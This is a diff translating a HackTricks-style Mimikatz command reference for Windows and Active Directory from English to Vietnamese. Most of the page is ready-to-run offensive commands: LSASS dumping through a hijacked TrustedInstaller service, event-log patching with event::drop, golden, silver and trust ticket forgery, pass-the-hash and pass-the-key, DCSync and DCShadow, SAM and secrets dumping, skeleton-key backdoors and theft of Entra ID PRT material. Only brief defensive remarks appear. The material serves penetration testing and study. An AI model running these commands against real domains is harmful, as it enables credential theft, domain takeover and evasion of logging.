@@ -3,32 +3,32 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!<sup>[[3]](#references)</sup>
+**Trang này dựa trên một bài viết từ [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Hãy xem bản gốc để biết thêm thông tin!<sup>[[3]](#references)</sup>
 
-## LM and Clear-Text in memory
+## LM và Clear-Text trong bộ nhớ
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+Kể từ Windows 8.1 và Windows Server 2012 R2, các biện pháp đáng kể đã được triển khai để bảo vệ chống đánh cắp thông tin xác thực:
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- **LM hashes và mật khẩu dạng văn bản thuần** không còn được lưu trong bộ nhớ nhằm tăng cường bảo mật. Để tắt Digest Authentication, một thiết lập registry cụ thể, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, phải được cấu hình với giá trị DWORD là `0`, đảm bảo mật khẩu "clear-text" không được lưu trong LSASS.
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-  1. Modifying the registry at _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-  2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- **LSA Protection** được giới thiệu để bảo vệ tiến trình Local Security Authority (LSA) khỏi việc đọc bộ nhớ và chèn mã trái phép. Việc này được thực hiện bằng cách đánh dấu LSASS là một tiến trình được bảo vệ. Để kích hoạt LSA Protection:
+  1. Sửa đổi registry tại _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ bằng cách đặt `RunAsPPL` thành `dword:00000001`.
+  2. Triển khai Group Policy Object (GPO) để áp dụng thay đổi registry này trên các thiết bị được quản lý.
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+Bất chấp những biện pháp bảo vệ này, các công cụ như Mimikatz có thể vượt qua LSA Protection bằng cách sử dụng các driver cụ thể, dù những hành động như vậy nhiều khả năng sẽ được ghi lại trong nhật ký sự kiện.
 
-On modern workstations this matters even more because **Credential Guard is enabled by default on many Windows 11 22H2+ and Windows Server 2025 domain-joined, non-DC systems**, while **LSASS-as-PPL is enabled by default on fresh Windows 11 22H2+ installs**. In practice, this means `sekurlsa::logonpasswords` often yields less material than older tradecraft expected and operators increasingly pivot to **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, or **CloudAP/PRT-oriented modules**. For the protection side, check [Windows credentials protections](credentials-protections.md).
+Trên các máy trạm hiện đại, điều này càng quan trọng hơn vì **Credential Guard được bật mặc định trên nhiều hệ thống Windows 11 22H2+ và Windows Server 2025 đã tham gia miền, không phải DC**, trong khi **LSASS-as-PPL được bật mặc định trên các bản cài mới Windows 11 22H2+**. Trên thực tế, điều này có nghĩa là `sekurlsa::logonpasswords` thường thu được ít thông tin hơn so với kỳ vọng từ các kỹ thuật cũ; operator ngày càng chuyển sang **offline minidumps**, **trích xuất khóa Kerberos (`sekurlsa::ekeys`)** hoặc **các module hướng đến CloudAP/PRT**. Để tìm hiểu về các biện pháp bảo vệ, xem [Windows credentials protections](credentials-protections.md).
 
-### Counteracting SeDebugPrivilege Removal
+### Đối phó với việc gỡ bỏ SeDebugPrivilege
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
+Quản trị viên thường có SeDebugPrivilege, cho phép họ debug chương trình. Quyền này có thể bị giới hạn để ngăn việc tạo memory dump trái phép, một kỹ thuật phổ biến mà attacker dùng để trích xuất thông tin xác thực từ bộ nhớ. Tuy nhiên, ngay cả khi quyền này bị gỡ bỏ, tài khoản TrustedInstaller vẫn có thể tạo memory dump bằng cách sử dụng cấu hình service tùy chỉnh:
 
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
 
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
+Điều này cho phép dump bộ nhớ của `lsass.exe` ra tệp, sau đó có thể phân tích tệp này trên một hệ thống khác để trích xuất thông tin đăng nhập:
 
 ```
 # privilege::debug
@@ -36,42 +36,42 @@ This allows the dumping of the `lsass.exe` memory to a file, which can then be a
 # sekurlsa::logonpasswords
 ```
 
-## Mimikatz Options
+## Tùy chọn Mimikatz
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+Can thiệp nhật ký sự kiện trong Mimikatz gồm hai hành động chính: xóa nhật ký sự kiện và vá dịch vụ Event để ngăn ghi nhật ký các sự kiện mới. Dưới đây là các lệnh thực hiện những thao tác này:
 
-#### Clearing Event Logs
+#### Xóa nhật ký sự kiện
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+- **Lệnh**: Thao tác này nhằm xóa nhật ký sự kiện, khiến việc theo dõi các hoạt động độc hại trở nên khó khăn hơn.
+- Mimikatz không cung cấp lệnh trực tiếp trong tài liệu tiêu chuẩn để xóa nhật ký sự kiện qua dòng lệnh. Tuy nhiên, việc thao tác với nhật ký sự kiện thường cần dùng các công cụ hệ thống hoặc script bên ngoài Mimikatz để xóa nhật ký cụ thể (ví dụ: dùng PowerShell hoặc Windows Event Viewer).
 
-#### Experimental Feature: Patching the Event Service
+#### Tính năng thử nghiệm: Vá dịch vụ Event
 
-- **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- **Lệnh**: `event::drop`
+- Lệnh thử nghiệm này được thiết kế để sửa đổi cách hoạt động của Event Logging Service, qua đó ngăn dịch vụ ghi lại các sự kiện mới.
+- Ví dụ: `mimikatz "privilege::debug" "event::drop" exit`
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+- Lệnh `privilege::debug` đảm bảo Mimikatz có đủ quyền cần thiết để sửa đổi các dịch vụ hệ thống.
+- Sau đó, lệnh `event::drop` vá dịch vụ Event Logging.
 
-### Kerberos Ticket Attacks
+### Tấn công vé Kerberos
 
-Use the commands below as quick syntax reminders. The dedicated pages for [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), and [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contain the up-to-date AES/PAC/opsec nuances.
+Dùng các lệnh bên dưới để tham khảo nhanh cú pháp. Các trang riêng về [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) và [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) trình bày các chi tiết mới nhất về AES/PAC/opsec.
 
-### Golden Ticket Creation
+### Tạo Golden Ticket
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
+Golden Ticket cho phép giả mạo quyền truy cập trên toàn domain. Lệnh và tham số chính:
 
-- Command: `kerberos::golden`
-- Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
+- Lệnh: `kerberos::golden`
+- Tham số:
+  - `/domain`: Tên domain.
+  - `/sid`: Security Identifier (SID) của domain.
+  - `/user`: Tên người dùng cần giả mạo.
+  - `/krbtgt`: NTLM hash của tài khoản dịch vụ KDC của domain.
+  - `/ptt`: Trực tiếp inject ticket vào bộ nhớ.
+  - `/ticket`: Lưu ticket để sử dụng sau này.
 
-Example:
+Ví dụ:
 
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
@@ -79,27 +79,27 @@ mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-1234567
 
 ### Silver Ticket Creation
 
-Silver Tickets grant access to specific services. Key command and parameters:
+Silver Ticket cấp quyền truy cập vào các dịch vụ cụ thể. Lệnh và tham số chính:
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
+- Lệnh: Tương tự Golden Ticket nhưng nhắm vào các dịch vụ cụ thể.
+- Tham số:
+  - `/service`: Dịch vụ cần nhắm đến (ví dụ: cifs, http).
+  - Các tham số khác tương tự Golden Ticket.
 
-Example:
+Ví dụ:
 
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
 
-### Trust Ticket Creation
+### Tạo Trust Ticket
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+Trust Ticket được dùng để truy cập tài nguyên giữa các domain bằng cách tận dụng các mối quan hệ trust. Các lệnh và tham số chính:
 
-- Command: Similar to Golden Ticket but for trust relationships.
+- Command: Tương tự Golden Ticket nhưng dành cho các mối quan hệ trust.
 - Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
+  - `/target`: FQDN của domain đích.
+  - `/rc4`: Hash NTLM của tài khoản trust.
 
 Example:
 
@@ -107,33 +107,33 @@ Example:
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
 
-### Additional Kerberos Commands
+### Các lệnh Kerberos bổ sung
 
 - **Listing Tickets**:
 
   - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+  - Liệt kê tất cả Kerberos ticket của phiên người dùng hiện tại.
 
 - **Pass the Cache**:
 
   - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+  - Inject Kerberos ticket từ các file cache.
+  - Ví dụ: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Pass the Ticket**:
 
   - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+  - Cho phép sử dụng Kerberos ticket trong một phiên khác.
+  - Ví dụ: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
 - **Purge Tickets**:
   - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+  - Xóa tất cả Kerberos ticket khỏi phiên.
+  - Hữu ích trước khi dùng các lệnh thao túng ticket để tránh xung đột.
 
 ### Over-Pass-the-Hash / Pass-the-Key
 
-If `RC4` is disabled or unreliable, Mimikatz can patch **AES128/AES256 Kerberos keys** into the current logon session instead of only using an NT hash. This is usually a better fit for modern domains than treating `sekurlsa::pth` as NTLM-only.<sup>[[1]](#references)</sup>
+Nếu `RC4` bị tắt hoặc không đáng tin cậy, Mimikatz có thể patch **khóa Kerberos AES128/AES256** vào phiên đăng nhập hiện tại thay vì chỉ dùng NT hash. Cách này thường phù hợp với các domain hiện đại hơn so với việc xem `sekurlsa::pth` chỉ dành cho NTLM.<sup>[[1]](#references)</sup>
 
 ```bash
 mimikatz "privilege::debug" "sekurlsa::ekeys" exit
@@ -141,45 +141,45 @@ mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /r
 mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
 ```
 
-`/impersonate` reuses the current process instead of spawning a new console, which is handy when you want to immediately run things like `lsadump::dcsync` in the same context.
+`/impersonate` sử dụng lại tiến trình hiện tại thay vì tạo một console mới, rất hữu ích khi bạn muốn chạy ngay các lệnh như `lsadump::dcsync` trong cùng ngữ cảnh.
 
-### Active Directory Tampering
+### Can thiệp Active Directory
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation. See [DCShadow](../active-directory-methodology/dcshadow.md).
+- **DCShadow**: Tạm thời khiến một máy hoạt động như DC để thao tác với đối tượng AD. Xem [DCShadow](../active-directory-methodology/dcshadow.md).
 
   - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Mimic a DC to request password data. See [DCSync](../active-directory-methodology/dcsync.md).
+- **DCSync**: Giả lập DC để yêu cầu dữ liệu mật khẩu. Xem [DCSync](../active-directory-methodology/dcsync.md).
   - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Credential Access
+### Truy cập thông tin xác thực
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
+- **LSADUMP::LSA**: Trích xuất thông tin xác thực từ LSA.
 
   - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
+- **LSADUMP::NetSync**: Giả lập DC bằng dữ liệu mật khẩu của tài khoản máy tính.
 
-  - _No specific command provided for NetSync in original context._
+  - _Không có lệnh cụ thể cho NetSync trong ngữ cảnh ban đầu._
 
-- **LSADUMP::SAM**: Access local SAM database.
+- **LSADUMP::SAM**: Truy cập cơ sở dữ liệu SAM cục bộ.
 
   - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
+- **LSADUMP::Secrets**: Giải mã các bí mật được lưu trong registry.
 
   - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
+- **LSADUMP::SetNTLM**: Đặt NTLM hash mới cho người dùng.
 
   - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
+- **LSADUMP::Trust**: Truy xuất thông tin xác thực xác thực trust.
   - `mimikatz "lsadump::trust" exit`
 
-### Cloud credentials / Entra ID
+### Thông tin xác thực trên cloud / Entra ID
 
-On **Entra ID** or **hybrid-joined** hosts, `sekurlsa::cloudap` can expose cached **Primary Refresh Token (PRT)** material from LSASS. If the associated Proof-of-Possession key is software-protected, `dpapi::cloudapkd` can derive the clear/derived key material needed for follow-on **Pass-the-PRT** workflows.<sup>[[1]](#references)</sup>
+Trên các máy chủ **Entra ID** hoặc **hybrid-joined**, `sekurlsa::cloudap` có thể làm lộ dữ liệu **Primary Refresh Token (PRT)** được lưu trong bộ nhớ đệm của LSASS. Nếu khóa Proof-of-Possession liên quan được bảo vệ bằng phần mềm, `dpapi::cloudapkd` có thể suy ra dữ liệu khóa rõ/đã dẫn xuất cần thiết cho các quy trình **Pass-the-PRT** tiếp theo.<sup>[[1]](#references)</sup>
 
 ```bash
 mimikatz "privilege::debug" "sekurlsa::cloudap" exit
@@ -187,60 +187,59 @@ mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
 mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
 ```
 
-This becomes much harder when the key is TPM-backed, but it is worth checking on hybrid endpoints because the cached CloudAP data may be more interesting than classic `wdigest` output.<sup>[[2]](#references)</sup> For the cloud-side abuse chain, see [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).
+Điều này trở nên khó hơn nhiều khi khóa được TPM bảo vệ, nhưng vẫn đáng kiểm tra trên các endpoint hybrid vì dữ liệu CloudAP được lưu trong cache có thể thú vị hơn kết quả `wdigest` thông thường.<sup>[[2]](#references)</sup> Để xem chuỗi lạm dụng phía cloud, hãy xem [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).
 
-### Miscellaneous
+### Khác
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
+- **MISC::Skeleton**: Tiêm backdoor vào LSASS trên DC.
   - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Privilege Escalation
+### Leo thang đặc quyền
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
+- **PRIVILEGE::Backup**: Có được quyền sao lưu.
 
   - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
+- **PRIVILEGE::Debug**: Có được đặc quyền debug.
   - `mimikatz "privilege::debug" exit`
 
-### Credential Dumping
+### Dump thông tin xác thực
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
+- **SEKURLSA::LogonPasswords**: Hiển thị thông tin xác thực của người dùng đã đăng nhập.
 
   - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
+- **SEKURLSA::Tickets**: Trích xuất vé Kerberos từ bộ nhớ.
   - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Sid and Token Manipulation
+### Thao tác SID và token
 
-- **SID::add/modify**: Change SID and SIDHistory.
+- **SID::add/modify**: Thay đổi SID và SIDHistory.
 
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: _No specific command for modify in original context._
+  - Thêm: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+  - Sửa đổi: _Không có lệnh cụ thể để sửa đổi trong ngữ cảnh ban đầu._
 
-- **TOKEN::Elevate**: Impersonate tokens.
+- **TOKEN::Elevate**: Mạo danh token.
   - `mimikatz "token::elevate /domainadmin" exit`
 
 ### Terminal Services
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
+- **TS::MultiRDP**: Cho phép nhiều phiên RDP.
 
   - `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: List TS/RDP sessions.
-  - _No specific command provided for TS::Sessions in original context._
+- **TS::Sessions**: Liệt kê các phiên TS/RDP.
+  - _Không có lệnh cụ thể cho TS::Sessions trong ngữ cảnh ban đầu._
 
 ### Vault
 
-- Extract passwords from Windows Vault.
+- Trích xuất mật khẩu từ Windows Vault.
   - `mimikatz "vault::cred /patch" exit`
 
 
 ## References
 
-- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
-- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
-- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)
-
+- [1] [Các công cụ của The Hacker – Các module Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
+- [2] [Synacktiv – WHFB và Entra ID: Chào đón luồng cache mới của bạn](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
+- [3] [Tài liệu tham khảo lệnh Mimikatz](https://adsecurity.org/?page_id=1821)
 {{#include ../../banners/hacktricks-training.md}}
